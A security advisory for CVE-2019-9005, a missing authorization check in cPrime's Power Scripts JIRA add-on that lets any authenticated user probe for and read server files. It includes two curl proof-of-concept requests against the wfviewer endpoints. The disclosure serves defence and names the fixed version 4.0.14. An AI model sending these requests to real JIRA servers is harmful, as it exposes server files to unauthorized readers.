## Improper Authorizations / Path Traversal Vulnerability in cPrime Power Scripts for JIRA

| Title | Improper Authorizations / Path Traversal Vulnerability in cPrime Power Scripts for JIRA |
| --- | --- |
| Product | cPrime Power Scripts |
| Vulnerable Version | < 4.0.14 |
| Fixed Version | 4.0.14 |
| CVE Number | CVE-2019-9005 |
| **Impact** | Critical |
| **Homepage** | <https://www.cprime.com/technology/power-scripts/Credits> |
| **Credits** | Cosmin Botin (Detack GmbH)Felix Wallaschek (Detack GmbH) |

The JIRA addon Power Scripts by cPrime was affected by improper authorizations, allowing any JIRA user to probe for and read arbitrary files from the underlaying server file system. The vendor provides patched versions of the addon.

## **Product Description**

Power Scripts (formerly JJupin) provides versatile scripting capabilities and virtually unlimited power to enhance and automate your most complex JIRA workflows. With Power Scripts, you can effortlessly harness the full power of JIRA without any technical JIRA knowledge. Manipulate JIRA UI, access unlimited databases or any back-office system, specify custom workflow post functions and validators, and so much more!

Source: <https://www.cprime.com/technology/power-scripts/>

## **Vulnerability Description**

The Power Scripts addon implements a REST API which offers several endpoints for different functionalities. The wfviewer/filecheck and wfviewer/filecontent endpoints, which are used by administrators to check and read local files were found to not check the authorization of the calling user, allowing any authenticated user to probe for and read files from the JIRA server filesystem.

## **Proof of Concept**

File Probing:

```
curl -s -u <user>:<password> "http://jira.server.intern/rest/keplerrominfo/jjupin/2.0/wfviewer/filecheck?path=c%3A%2FWindows%2Fwin.ini&_=1514764800000"
{"id":9}
```

File Reading:

```
curl -s -u <user>:<password> "http://jira.server.intern/rest/keplerrominfo/jjupin/2.0/wfviewer/filecontent?path=c%3A%2FWindows%2Fwin.ini&_=1514764800000"  | hexdump -C

00000071
```
## **Solution / Workaround**

It is recommended to update the Power Scripts addon to the latest available version.
